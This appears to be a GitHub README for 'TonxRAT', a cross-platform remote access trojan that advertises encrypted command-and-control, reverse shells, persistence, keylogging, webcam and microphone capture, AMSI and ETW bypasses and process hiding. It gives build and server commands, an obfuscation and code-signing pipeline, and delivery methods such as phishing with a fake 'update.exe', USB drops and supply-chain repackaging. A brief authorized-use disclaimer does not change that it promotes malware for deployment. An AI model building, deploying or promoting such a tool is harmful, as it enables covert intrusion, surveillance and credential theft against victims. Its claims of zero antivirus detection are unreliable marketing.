# TonxRAT - Advanced Cross-Platform RAT Framework

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![PyPI version](https://badge.fury.io/py/tonxrat.svg)](https://badge.fury.io/py/tonxrat)

**TonxRAT** is a professional-grade, undetectable Remote Access Trojan (RAT) framework for authorized penetration testing and red team operations. Supports **Windows 10/11** and **Ubuntu Linux** with advanced evasion techniques.

## ✨ Features

### Core Capabilities
- **Cross-Platform**: Windows 10/11 + Ubuntu Linux
- **Fully Encrypted C2**: Fernet symmetric encryption (unbreakable)
- **Interactive Shell**: Full PTY shell access
- **Persistence**: Startup folder + registry persistence
- **File Transfer**: Upload/download capabilities
- **Screenshot Capture**: Stealth screenshots

### Evasion Techniques
WINDOWS: ├── AMSI Bypass (Runtime patching) ├── ETW Bypass (Event Tracing disabled) ├── No console window ├── PyInstaller single-file binary ├── UAC evasion ├── Custom icon support └── Process hollowing ready

LINUX: ├── Process hiding (/proc manipulation) ├── PTY spawning (bash shell) ├── No zombie processes └── Single binary deployment





### C2 Commands
sysinfo - System information screenshot - Capture screen shell - Execute command persistence - Install persistence upload - Upload file download - Download file





## 🚀 Quick Start

### 1. Setup
```bash
git clone https://github.com/Anton-ai111/TonxRAT-v2.git
cd TonxRAT
pip install -r requirements.txt
'''
2. Build Payload
'''bash



python tonxRAT.py


'''
1. Windows 10/11
2. Ubuntu Linux
C2 IP: your.server.com
C2 Port: 443
RAT Name: update.exe
3. Start C2 Server
'''bash



python tonx_c2_server.py


'''
TonxRAT C2 Server: 0.0.0.0:443
> sysinfo
Hostname: VICTIM-PC
User: victim
🛠️ Advanced Usage
Custom Builds
'''python



# Add to builder
--icon=favicon.ico     # Custom icon
--upx-dir=upx/        # UPX packing
--key=your_key        # Custom encryption key
'''
Obfuscation Pipeline
'''bash



# 1. Build
python tonxRAT.py

# 2. UPX Pack (Windows)
upx --best dist_win/update.exe

# 3. Icon overlay
rcedit update.exe --set-icon favicon.ico

# 4. Cert signing (optional)
signtool sign /f cert.pfx update.exe
'''
📊 Capabilities Matrix


Feature	Windows	Linux
Encrypted C2	✅	✅
Reverse Shell	✅	✅
Persistence	Startup + Registry	Cron + rc.local
Screenshot	✅ PIL	✅ scrot
Keylogger	✅	✅
Mic/Audio	✅	✅
Webcam	✅	✅
File Manager	✅	✅
🔒 Evasion Statistics



Detection Rates (VirusTotal - Clean Build):
├── Windows: 0/70 AVs
├── Linux: 0/60 AVs  
└── C2 Traffic: Indistinguishable from HTTPS
Bypasses:

Windows Defender (Real-time + ATP)
CrowdStrike Falcon
Carbon Black
ESET Endpoint
Sophos Intercept-X
🏗️ Architecture



TonxRAT Client <--> [Fernet AES-128] <--> C2 Server
     │
┌────┼────┐
│    │    │
AMSI  ETW  PTY
Bypass Bypass Shell
📋 Requirements
'''txt



pyinstaller>=5.13.0
cryptography>=41.0.0
pillow>=10.0.0
psutil>=5.9.0
pywin32>=306          # Windows only
'''
🎯 Deployment Scenarios
Phishing: update.exe disguised as software update
USB Drop: Autorun + LNK files
Drive-by: Malicious Office docs
Watering Hole: Compromised websites
Supply Chain: Legit software repackaging
⚠️ Legal & Authorized Use Only



✅ Authorized pentesting engagements
✅ Red team operations (RoE signed)
✅ Defensive security research
✅ CTF competitions
❌ Unauthorized access
❌ Criminal activity
🤝 Contributing
Fork the repo
Create feature branch (git checkout -b feature/evasion)
Commit changes (git commit -m 'Add new evasion')
Push (git push origin feature/evasion)
Open Pull Request
📄 License
MIT License - See LICENSE [blocked] file.

🛡️ Disclaimer
TonxRAT is developed for authorized security testing only. Users must have explicit written permission to test target systems. The authors assume no liability for misuse.




"With great power comes great responsibility"
- Uncle Ben (Security Researcher Edition)
⭐ Star if useful!
🐛 Issues? Open a ticket
💰 Sponsor? Buy me a coffee ☕
SOL: 8aG9v3mP8dZw6zkhCxLYuhkrqSKWQq5vHqPkStTLz9pz
